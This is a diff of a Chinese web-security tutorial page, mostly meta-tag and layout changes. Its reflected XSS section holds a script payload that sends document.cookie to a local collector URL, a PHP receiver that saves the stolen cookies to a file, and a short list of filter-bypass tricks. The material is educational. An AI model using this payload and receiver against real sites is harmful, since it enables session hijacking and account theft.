@@ -16,8 +16,9 @@
 <meta property="og:description" content="web安全工具以及一些招式实现原理以及测试思路的是靠更重要">
 <meta property="og:image" content="http://ww4.sinaimg.cn/large/0069oIoUgy1fpj0x87rfij30jw0b9q4j.jpg">
 <meta property="og:image" content="http://ww3.sinaimg.cn/large/0069oIoUgy1fpj1fd28poj30jd0b0gnc.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/0069oIoUgy1fpo75xaaplj30dx0ah75t.jpg">
 <meta property="og:image" content="http://ww4.sinaimg.cn/large/0069oIoUgy1fpou23etcwj30bu06p3za.jpg">
-<meta property="og:updated_time" content="2018-03-26T03:56:34.481Z">
+<meta property="og:updated_time" content="2018-03-26T04:02:10.793Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="web安全">
 <meta name="twitter:description" content="web安全工具以及一些招式实现原理以及测试思路的是靠更重要">
@@ -225,10 +226,8 @@ webshell文件
      攻击代码在数据库里输出在http响应中
 </code></pre><h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><pre><code>攻击代码在url里输出在http响应中
 攻击思路：
-![image](http://ww2.sinaimg.cn/large/0069oIoUgy1fpo75xaaplj30dx0ah75t.jpg)
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> 用于攻击的js代码(需要进行urldecode)</span><br><span class="line">&lt;script&gt;document.location=<span class="string">'http://127.0.0.1/cookie.php?cookie='</span>+document.cookie&lt;/script&gt;</span><br><span class="line"> 服务端代码；将前面劫持来的cookie写入text文本中</span><br><span class="line"> &lt;?php</span><br><span class="line">     <span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">'cookie'</span>];</span><br><span class="line">	 file_put_contents(<span class="string">'cookie.txt'</span>,<span class="variable">$cookie</span>);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
-
-绕过方法：
+</code></pre><p> <img src="http://ww2.sinaimg.cn/large/0069oIoUgy1fpo75xaaplj30dx0ah75t.jpg" alt="image"><br>         <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">	 用于攻击的js代码(需要进行urldecode)</span><br><span class="line">&lt;script&gt;document.location=<span class="string">'http://127.0.0.1/cookie.php?cookie='</span>+document.cookie&lt;/script&gt;</span><br><span class="line">	 服务端代码；将前面劫持来的cookie写入text文本中</span><br><span class="line">	 &lt;?php</span><br><span class="line">	     <span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">'cookie'</span>];</span><br><span class="line">		 file_put_contents(<span class="string">'cookie.txt'</span>,<span class="variable">$cookie</span>);</span><br><span class="line">	 ?&gt;</span><br></pre></td></tr></table></figure></p>
+<pre><code>绕过方法：
     1.大小写混写
     2.嵌套写入
     3.注释符过滤
